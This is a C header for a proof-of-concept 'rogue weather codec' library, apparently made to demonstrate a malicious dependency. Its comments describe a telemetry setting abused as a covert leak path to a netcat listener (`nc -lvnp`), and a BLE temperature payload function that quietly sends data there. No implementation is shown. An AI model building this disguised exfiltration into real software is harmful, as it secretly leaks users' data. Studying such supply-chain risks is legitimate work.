#ifndef ROGUE_WEATHER_CODEC_H
#define ROGUE_WEATHER_CODEC_H

#include <stddef.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

/**
 * Looks like normal dependency wiring: the codec can be pointed at a remote
 * collector for diagnostics/telemetry. In the PoC version, this is abused as
 * the leak path — the "collector" is just an `nc -lvnp <port>` listener.
 *
 * Pass NULL host or 0 port to keep the current value for that field.
 */
void rogue_weather_codec_set_nc_target(const char *host, uint16_t port);

/**
 * Builds the BLE payload for the temperature notification.
 * Normal behavior: writes the raw float into out and returns sizeof(float).
 * PoC behavior: keeps the normal behavior, but also sends a demo leak
 * to the configured nc listener.
 */
size_t rogue_weather_codec_build_ble_temperature_payload(float temperature,
                                                         uint8_t *out,
                                                         size_t out_len);

#ifdef __cplusplus
}
#endif

#endif // ROGUE_WEATHER_CODEC_H
